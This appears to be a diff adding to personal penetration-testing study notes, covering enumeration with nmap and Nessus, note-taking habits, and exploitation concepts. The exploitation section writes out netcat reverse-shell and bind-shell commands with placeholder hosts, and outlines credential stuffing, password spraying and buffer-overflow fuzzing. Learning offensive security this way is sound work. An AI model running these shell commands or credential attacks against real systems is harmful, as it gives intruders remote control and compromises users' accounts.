@@ -149,3 +149,58 @@ RECONNAISSANCE
       - If the website uses vulnerable versions, this can be exploited
   - BurpSuite:
     - A web proxy that can intercept traffic from websites
+
+ENUMERATION
+  - Vulhub
+    - Has lots of vulnerable virtual machine images to practice on
+  - nmap
+    - Useful for enumerating open ports and associated metadata
+    - Can make it stealither:
+      - make slower
+    - Can scan all ports or just specific ports
+    - Can fingerprint (get version, OS, etc.)
+    - Can scan TCP and/or UDP
+      - A UDP scan takes A LOOOONG time to complete
+  - Identify the ports that are usually most vulnerable
+    - 80 (HTTP), 443 (HTTPS), 139 (SMB)
+  - Nessus is a paid vulnerability scanner
+
+___________________________
+!!!! IMPORTANT !!!!
+Must develop a system for enumerating/note-taking
+Ideas:
+  - Always save scans to text files
+  - Timestamp
+  - Categorize
+    - e.g., when finding version numbers for software used, put them all together for easy access when researching potential exploits later
+___________________________
+
+EXPLOITATION
+  - Reverse shells
+    - A victim connects to you
+    - Far more common than Bind shells
+    - Example:
+      On Attacker's Machine:
+        $ nc -nvlp <port>                   # opens a port, which netcat then listens to for when the victim connects
+      On Victim's Machine:
+        $ nc <IP addr> <port> -e /bin/bash  # connects to attacker's IP addr on port and starts a bash shell
+  - Bind shells
+    - You open up a port and connect to the victim 
+    - Useful when you are behind a firewall or on a private network and don't want to fiddle with NAT
+    Example:
+      On Victim's Machine:
+        $ nc -nvlp <port> -e /bin/bash  # opens a shell on port of Victim's machine
+      On Attacker's Machine:
+        $ nc <IP addr> <port>           # connects to shell on open port at Victim's IP addr
+  - Payloads
+    - Staged vs. Non-Staged
+      - Diff = send in stages or send all at once
+  - Credential Stuffing
+    - Taking leaked credentials and attempting to use these credentials to sign in
+  - Password Spraying
+    - Taking known users and using good guesses of their passwords
+      - Be careful because you could lock out real users if you attack Active Directory
+  - Spiking/Fuzzing
+    - I'm not entirely sure what the difference between these two is
+    - Trying to find a buffer overflow opportunity by inputting lots of character data
+    - Goal is to find the offset where we can overwrite the EIP register (this is the return pointer)
